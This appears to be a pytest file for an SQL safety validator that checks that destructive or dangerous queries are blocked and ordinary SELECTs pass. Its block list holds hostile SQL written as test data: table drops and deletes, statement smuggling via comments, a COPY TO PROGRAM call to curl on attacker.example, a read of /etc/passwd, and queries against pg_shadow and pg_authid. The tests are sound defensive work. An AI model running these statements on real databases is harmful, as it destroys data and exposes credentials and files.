"""Layer 2 + 3 unit tests — every rejection rule, exercised on raw SQL strings.

This is the deterministic proof that destructive SQL is impossible by construction,
independent of the NL screen.
"""
import pytest

from app.sqlsafety.guard import validate_sql
from app.sqlsafety.validator import validate_ast

# (label, sql) pairs that MUST be blocked by AST validation (Layer 2).
BLOCKED_SQL = [
    ("delete", "DELETE FROM orders"),
    ("update", "UPDATE products SET unit_price = 0"),
    ("drop", "DROP TABLE customers"),
    ("truncate", "TRUNCATE order_items"),
    ("alter", "ALTER TABLE orders ADD COLUMN x int"),
    ("create", "CREATE TABLE steal AS SELECT * FROM customers"),
    ("grant", "GRANT ALL ON orders TO attacker"),
    ("multi-statement", "SELECT 1; DROP TABLE orders"),
    ("comment-smuggle", "SELECT 1 /* ok */; DELETE FROM orders"),
    ("case-obfuscation", "dRoP tAbLe products"),
    ("write-cte", "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x"),
    ("select-into", "SELECT * INTO backup_orders FROM orders"),
    ("copy-exfil", "COPY orders TO PROGRAM 'curl attacker.example'"),
    ("pg_sleep", "SELECT pg_sleep(600)"),
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
    ("dblink", "SELECT * FROM dblink('conn', 'select 1') AS t(x int)"),
    ("system-catalog", "SELECT * FROM pg_catalog.pg_authid"),
    ("pg-shadow", "SELECT * FROM pg_shadow"),
    ("info-schema", "SELECT table_name FROM information_schema.tables"),
    ("begin-commit", "BEGIN; DELETE FROM reviews; COMMIT"),
]


@pytest.mark.parametrize("label,sql", BLOCKED_SQL, ids=[c[0] for c in BLOCKED_SQL])
def test_ast_blocks_dangerous_sql(label, sql):
    res = validate_ast(sql)
    assert not res.valid, f"{label}: expected BLOCK, validator allowed it"
    assert res.errors


def test_valid_select_passes_ast():
    res = validate_ast("SELECT category_id, COUNT(*) FROM products GROUP BY category_id")
    assert res.valid
    assert "products" in res.tables


def test_policy_blocks_unknown_table(allow_list):
    r = validate_sql("SELECT salary FROM employee_payroll", allow_list)
    assert r.verdict == "BLOCK"
    assert any("employee_payroll" in e for e in r.errors)


def test_policy_blocks_unknown_column(allow_list):
    r = validate_sql("SELECT customer_password FROM orders", allow_list)
    assert r.verdict == "BLOCK"
    assert any("customer_password" in e for e in r.errors)


def test_limit_is_injected_when_absent(allow_list):
    r = validate_sql("SELECT order_id FROM orders", allow_list)
    assert r.verdict == "ALLOW"
    assert r.limit_applied == 10000
    assert "LIMIT" in r.safe_sql.upper()


def test_over_large_limit_is_clamped(allow_list):
    r = validate_sql("SELECT order_id FROM orders LIMIT 999999", allow_list)
    assert r.verdict == "ALLOW"
    assert r.limit_applied == 10000


def test_valid_join_with_output_alias_passes(allow_list):
    # ORDER BY on a SELECT-list alias must not be mistaken for a hallucinated column.
    sql = ("SELECT c.category_name_en, COUNT(*) AS units_sold "
           "FROM order_items i JOIN products p ON i.product_id=p.product_id "
           "JOIN categories c ON p.category_id=c.category_id "
           "GROUP BY c.category_name_en ORDER BY units_sold DESC LIMIT 10")
    r = validate_sql(sql, allow_list)
    assert r.verdict == "ALLOW", r.errors
    assert set(r.tables_used) == {"order_items", "products", "categories"}
